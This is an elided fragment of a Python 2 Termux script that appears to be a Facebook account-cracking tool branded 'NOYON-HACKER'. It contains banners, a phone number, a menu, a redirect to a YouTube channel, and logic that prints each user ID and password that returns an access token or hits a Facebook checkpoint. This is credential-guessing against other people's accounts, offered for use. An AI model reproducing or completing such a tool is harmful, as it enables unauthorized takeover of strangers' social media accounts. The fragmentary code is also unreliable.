...
"""
logo2 = """
\x1b[1;92m➣ NAME :           💗 NOYON-HACKER ISLAM 💗
\x1b[1;91m➣ PGE NAME :  💣TERMUX TEACHER NOYON-HACKER💣
\x1b[1;93m➣ PHONE NO :   👬 +8801864127191 👬
...
def menu():
	os.system('clear')
	print logo
	print "\033[1;96m💖━━━━━━━━━💘💘💘(NOYON-HACKER-NOYON-HACKER)💘💘💘━━━━━━━━💖\n" 
...
def action():
	...
	if ahmad =='':
		...
		os.system('xdg-open https://youtube.com/c/NOYON-HACKERTechnologychannel')
		login()
	elif ahmad =='0':
		exb()
	else:
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;96m[NOYON-HACKER-Checkpoint] ' + k + c + user + '  》  ' + pass1+'\n'
